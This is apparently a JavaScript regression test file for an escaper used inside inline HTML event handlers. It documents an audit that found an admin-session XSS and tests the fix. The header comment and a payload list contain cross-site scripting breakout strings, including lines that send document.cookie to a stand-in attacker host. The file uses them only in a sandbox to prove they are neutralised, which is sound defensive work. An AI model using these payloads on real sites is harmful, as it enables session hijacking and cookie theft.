// Security regression tests for escJs() — the escaper for a value that lands
// inside a JS string literal that itself lives inside an HTML event attribute.
//
//   node --test xss-inline-handlers.test.js
//
// WHY THIS FILE EXISTS (audit 2026-08-17)
// ---------------------------------------
// admin.html rendered its listings table as:
//
//     onclick="deleteListing('<id>','<title_en>')"
//
// interpolating the title through esc() — an HTML-context escaper that turns
// ' into &#39;. That is the wrong escaper for this position, because TWO
// parsers read the text in sequence:
//
//     raw attribute text  --HTML parser (decodes entities)-->  JS source
//                         --JS parser-->  executed program
//
// so &#39; becomes a live apostrophe BEFORE the JS parser ever runs, closing
// the string literal. A listing title of
//
//     ');fetch('https://attacker/'+document.cookie);//
//
// therefore executed as script in the administrator's own MFA-verified
// session — the single account that can write every table and both storage
// buckets. listing.html had the same shape on the public page via a unit-type
// name inside ptContactClick({… unit:'…'}), hitting every visitor instead.
//
// Listing/unit prose is NOT hand-typed-only: it arrives from Smart Import, the
// Facebook adapter, and AI generation, so an outsider can influence it.
//
// These tests run the REAL escJs() implementations extracted from the shipped
// files (same extract-the-real-function convention as image-cdn.test.js), and
// assert the payload is inert AFTER a genuine HTML attribute-value decode —
// not merely that some characters were replaced. Decoding is done with the
// same numeric/named entity rules a browser applies to attribute values, so a
// future "optimisation" that drops one of the two escaping layers fails here.

import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import fs from 'node:fs';

// ── Extract a named function from a shipped .js/.html file ──────────────────
function extractFn(file, name) {
  const src = fs.readFileSync(new URL('./' + file, import.meta.url), 'utf8');
  const start = src.indexOf('function ' + name + '(');
  if (start === -1) throw new Error(name + ' not found in ' + file);
  let i = src.indexOf('{', start), depth = 0;
  for (; i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') { depth--; if (depth === 0) { i++; break; } }
  }
  return src.slice(start, i);
}

function load(file, name) {
  const ctx = vm.createContext({});
  vm.runInContext(extractFn(file, name) + ';' + name, ctx);
  return vm.runInContext(name, ctx);
}

// The four shipped copies. They are separate files with no module system
// between them (this repo ships plain <script> tags), so each is tested.
const IMPLS = [
  ['admin.html',       'escJs'],
  ['listing.html',     'escJs'],
  ['components.js',    '_ptEscJs'],
  ['intelligence.js',  'escJs'],
];

// ── A real HTML attribute-value decoder ────────────────────────────────────
// Browsers decode character references inside attribute values before the
// value is used. This mirrors that step so the assertions below test what the
// JS parser ACTUALLY receives, rather than what the escaper happened to emit.
const NAMED = { amp: '&', quot: '"', apos: "'", lt: '<', gt: '>', nbsp: '\u00a0' };
function decodeAttrValue(s) {
  return s.replace(/&(#x[0-9a-fA-F]+|#[0-9]+|[a-zA-Z][a-zA-Z0-9]*);?/g, (m, body) => {
    if (body[0] === '#') {
      const code = body[1] === 'x' || body[1] === 'X'
        ? parseInt(body.slice(2), 16)
        : parseInt(body.slice(1), 10);
      return Number.isFinite(code) ? String.fromCodePoint(code) : m;
    }
    return Object.prototype.hasOwnProperty.call(NAMED, body) ? NAMED[body] : m;
  });
}

// Build the attribute exactly as the shipped templates do, decode it the way a
// browser would, then evaluate the resulting JS with a recording stub. If the
// escaping is correct the stub is called EXACTLY once and nothing else runs.
function runHandler(escFn, payload) {
  const attr = `deleteListing('11111111-2222-3333-4444-555555555555','${escFn(payload)}')`;
  const js = decodeAttrValue(attr);

  const calls = [];
  let escaped = false;
  const ctx = vm.createContext({
    deleteListing: (id, title) => calls.push({ id, title }),
    // Anything an injected payload would plausibly reach. Being called at all
    // means the string literal was broken out of.
    fetch: () => { escaped = true; },
    alert: () => { escaped = true; },
    document: { cookie: 'session=secret' },
    eval: () => { escaped = true; },
  });

  let syntaxError = null;
  try { vm.runInContext(js, ctx); } catch (e) { syntaxError = e; }
  return { js, calls, escaped, syntaxError };
}

// Payloads an attacker would actually try, each aimed at a different layer.
const PAYLOADS = [
  ["plain quote breakout",        "');alert(1);//"],
  ["double quote breakout",       '");alert(1);//'],
  ["pre-encoded numeric entity",  '&#39;);alert(1);//'],
  ["pre-encoded hex entity",      '&#x27;);alert(1);//'],
  ["pre-encoded named entity",    '&apos;);alert(1);//'],
  ["double-encoded ampersand",    '&amp;#39;);alert(1);//'],
  ["backslash escape of escape",  "\\');alert(1);//"],
  ["attribute breakout",          '"><script>alert(1)</script>'],
  ["exfiltration",                "');fetch('https://attacker.example/'+document.cookie);//"],
  ["newline statement injection", "'\n;alert(1);//"],
  ["U+2028 line separator",       "'\u2028alert(1);//"],
  ["U+2029 paragraph separator",  "'\u2029alert(1);//"],
  ["handler close attempt",       "' onmouseover='alert(1)"],
];

for (const [file, fnName] of IMPLS) {
  const escFn = load(file, fnName);

  test(`${file}: ${fnName}() neutralises every inline-handler payload`, () => {
    for (const [label, payload] of PAYLOADS) {
      const { js, calls, escaped, syntaxError } = runHandler(escFn, payload);

      assert.equal(syntaxError, null,
        `${label}: produced invalid JS (a syntax error means the literal was broken): ${js}`);
      assert.equal(escaped, false,
        `${label}: PAYLOAD EXECUTED — string-literal breakout. Decoded handler: ${js}`);
      assert.equal(calls.length, 1,
        `${label}: expected exactly one deleteListing() call, got ${calls.length}. Decoded: ${js}`);
      assert.equal(calls[0].title, payload,
        `${label}: the value must survive round-trip as inert DATA, unchanged`);
    }
  });

  test(`${file}: ${fnName}() leaves ordinary listing text untouched`, () => {
    // Real Pintag content: Lao/Chinese script, apostrophes, ampersands,
    // measurements. Escaping must not corrupt any of it.
    for (const value of [
      "Modern 4BR Pool Villa Near That Luang",
      "ວິລລ່າ 4 ຫ້ອງນອນພ້ອມສະລອຍນໍ້າໃກ້ທາດຫລວງ",
      "现代4卧室泳池别墅近塔銮",
      "Owner's residence — 250 m² & garden",
      'The "Riverside" Townhouse',
    ]) {
      const { calls, escaped } = runHandler(escFn, value);
      assert.equal(escaped, false, `unexpected execution for: ${value}`);
      assert.equal(calls[0].title, value, `content corrupted: ${value}`);
    }
  });

  test(`${file}: ${fnName}() handles null/undefined like the HTML escaper does`, () => {
    assert.equal(escFn(null), '');
    assert.equal(escFn(undefined), '');
    assert.equal(escFn(0), '0');
  });
}

// ── Guard the CALL SITES, not just the helper ───────────────────────────────
// A correct escaper that nobody calls fixes nothing. These assert the shipped
// templates actually use it in the positions the audit found vulnerable.
test('admin.html listings table interpolates through escJs(), never esc()', () => {
  const src = fs.readFileSync(new URL('./admin.html', import.meta.url), 'utf8');
  const handlers = src.match(/on(?:click|change|input|error)="[^"]*"/g) || [];
  const offenders = handlers.filter(h => /\besc\(/.test(h));
  assert.deepEqual(offenders, [],
    'HTML-context esc() found inside an inline handler — use escJs() there');
  assert.match(src, /onclick="deleteListing\('\$\{escJs\(p\.id\)\}','\$\{escJs\(p\.title_en\|\|''\)\}'\)"/,
    'the delete button must escape the listing title for the JS-string context');
});

test('listing.html inline handlers interpolate through escJs(), never esc()', () => {
  const src = fs.readFileSync(new URL('./listing.html', import.meta.url), 'utf8');
  const handlers = src.match(/onclick="[^"]*"/g) || [];
  const offenders = handlers.filter(h => /\besc\(/.test(h));
  assert.deepEqual(offenders, [],
    'HTML-context esc() found inside an inline handler — use escJs() there');
  assert.match(src, /trackMeta:\{unit:\\'\s*'\+escJs\(unitName\)/,
    'the unit-card CTA must escape the unit name for the JS-string context');
});

test('agent-setup.html builds its avatar fallback without an inline handler', () => {
  const src = fs.readFileSync(new URL('./agent-setup.html', import.meta.url), 'utf8');
  assert.ok(!/onerror="this\.parentElement\.innerHTML=/.test(src),
    'the inline onerror-innerHTML avatar fallback must stay replaced by DOM construction');
});
